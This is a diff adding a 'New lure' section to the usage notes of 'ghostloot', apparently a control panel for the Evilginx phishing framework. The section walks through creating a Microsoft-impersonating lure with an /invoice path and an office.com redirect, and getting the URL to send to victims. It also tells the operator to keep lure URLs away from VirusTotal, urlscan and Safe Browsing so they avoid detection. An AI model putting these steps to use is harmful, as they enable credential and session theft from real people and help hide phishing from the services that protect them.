@@ -37,6 +37,31 @@ ghostloot help         this sheet
 `down` does **not** stop Evilginx. The phishlet keeps running. That is
 intentional: closing the laptop should not take the lure offline.
 
+## New lure
+
+The inbox cannot create lures. Attach to Evilginx:
+
+```bash
+ghostloot console
+```
+
+You are in the Evilginx prompt (`:`). Tab completes.
+
+```
+phishlets                          # must be enabled, hostname already set
+lures create microsoft             # use your phishlet name
+lures                              # note the new id
+lures edit <id> path /invoice      # optional
+lures edit <id> redirect_url https://www.office.com
+lures get-url <id>                 # this is the link you send
+```
+
+Leave without killing the server: **Ctrl-b**, then **d**.  
+`Ctrl-c` stops Evilginx. Do not do that.
+
+Paste the URL into GhostLoot → Lures if you want up/down on it. Do not
+submit lure URLs to VirusTotal, urlscan or Safe Browsing.
+
 ## In the panel
 
 Open http://127.0.0.1:8090 (GhostLoot does this for you). Press `?`.
